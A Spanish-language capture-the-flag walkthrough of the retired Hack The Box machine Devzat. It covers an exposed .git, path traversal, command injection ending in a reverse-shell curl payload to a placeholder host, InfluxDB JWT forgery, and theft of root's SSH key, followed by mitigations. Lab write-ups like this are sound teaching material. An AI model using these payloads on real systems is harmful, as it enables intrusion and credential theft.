---
machine: Devzat
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, git, command-injection, influxdb, jwt, cve-2019-20933, ssh]
---

# Devzat — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La máquina gira alrededor de Devzat, un chat que se usa por SSH en el puerto `8000`. El sitio principal anuncia la aplicación y el vhost `pets.devzat.htb` expone el repositorio `.git`. Al reconstruir el código aparecen un directory traversal y una inyección de comandos en el parámetro `species` (`cat characteristics/<species>`), que da shell como `partick`. Desde localhost se accede al chat de `catherine`, cuyo historial menciona una instancia de InfluxDB. La CVE-2019-20933 permite forjar un JWT con secreto vacío, leer la base y recuperar su contraseña. `catherine` puede leer el código de una nueva versión de Devzat, con un comando vulnerable a file read que permite obtener la clave privada de root y entrar por SSH.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,8000 <IP>
```

- `22` OpenSSH 8.2p1 Ubuntu.
- `80` Apache httpd 2.4.41.
- `8000` habla SSH: es el chat Devzat, no un servicio web.

```bash
ffuf -u http://devzat.htb -H "Host: FUZZ.devzat.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <SIZE>
```

El vhost `pets.devzat.htb` aparece al fuzzear y se añade a `/etc/hosts`.

## Enumeración

`devzat.htb` explica cómo conectarse al chat y muestra un usuario de ejemplo. `pets.devzat.htb` es una tienda de mascotas con un formulario que envía la especie a la API.

El directorio `.git` es accesible en la raíz del vhost:

```bash
git-dumper http://pets.devzat.htb/.git/ pets
cd pets && git log --oneline
```

El código reconstruido muestra el manejador de la petición y la línea vulnerable:

```go
cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
```

El mismo parámetro se usa antes para componer una ruta, lo que permite un traversal de lectura:

```text
GET /?species=../../../../../../../etc/passwd
```

## Foothold

La inyección se explota añadiendo un separador de comandos al valor de `species`:

```bash
curl -s "http://pets.devzat.htb/?species=dog;id"
curl -s "http://pets.devzat.htb/?species=dog;bash+-c+'bash+-i+>%26+/dev/tcp/<LHOST>/<LPORT>+0>%261'"
```

La ejecución es como `partick`. Se estabiliza la shell y se comprueba que el chat de Devzat escucha en `8000` sobre localhost.

## Movimiento lateral

El chat rechaza algunos nombres de usuario desde fuera, pero permite conectarse como `partick`:

```bash
ssh -p 8000 partick@devzat.htb
```

En el historial de conversaciones, `catherine` comenta que tiene una instancia de InfluxDB. Un `netstat -tlnp` confirma el puerto `8086` en localhost. La versión es vulnerable a la CVE-2019-20933: InfluxDB acepta un JWT firmado con un secreto compartido vacío.

Se genera un token con el usuario `catherine` y se consulta la API:

```bash
curl -s "http://127.0.0.1:8086/query?db=devzat&q=SHOW+USERS" -H "Authorization: Bearer <JWT>"
curl -s "http://127.0.0.1:8086/query?db=devzat&q=SELECT+*+FROM+users" -H "Authorization: Bearer <JWT>"
```

La respuesta incluye la contraseña de `catherine`, que se usa con `su`.

## Escalada de privilegios

En el home de `catherine` hay una copia del código y del binario de una versión nueva de Devzat. El análisis muestra un comando añadido que lee un archivo indicado por el usuario. Apuntándolo a la clave privada de root:

```text
<COMANDO> /root/.ssh/id_rsa
```

se obtiene la clave, se guarda con permisos `600` y se entra como root:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@devzat.htb
```

## Evidencia

- `.git` descargado y código con `exec.Command("sh", "-c", ...)`.
- Lectura de `/etc/passwd` por traversal.
- Ejecución de `id` y reverse shell como `partick`.
- Historial del chat y puerto `8086` en localhost.
- JWT con secreto vacío y contraseña de `catherine` en InfluxDB.
- Clave privada de root leída por el comando vulnerable.

## Lecciones aprendidas

- Un `.git` expuesto entrega el código y, con él, las vulnerabilidades exactas.
- Concatenar entrada en una línea de comandos es ejecución, aunque el binario sea Go.
- Los servicios internos (bases de datos, paneles) solo son inalcanzables hasta que hay una shell local.
- Una dependencia antigua con bypass de autenticación convierte una base interna en un volcado de credenciales.
- El código de una versión en desarrollo puede introducir funciones más peligrosas que la versión publicada.

## Mitigaciones y detección

- No publicar `.git`, backups ni código fuente en el document root.
- Validar el parámetro contra una lista de especies y usar `exec.Command` sin `sh -c`.
- Actualizar InfluxDB a una versión corregida y exigir un secreto JWT no vacío.
- Limitar el acceso a InfluxDB a localhost con autenticación y TLS.
- Revisar los comandos nuevos del chat antes de desplegarlos y restringir las rutas que pueden leer.
- Alertar de peticiones con `;`, `|` o `$()` en parámetros y de lectura de claves SSH.

## Referencias

- [0xdf — Devzat](https://0xdf.gitlab.io/2022/03/12/htb-devzat.html)
- [IppSec — Devzat](https://www.youtube.com/watch?v=QEgtbzS1Pyc)
- [Hack The Box — Devzat](https://app.hackthebox.com/machines/devzat)
- [NVD — CVE-2019-20933](https://nvd.nist.gov/vuln/detail/CVE-2019-20933)
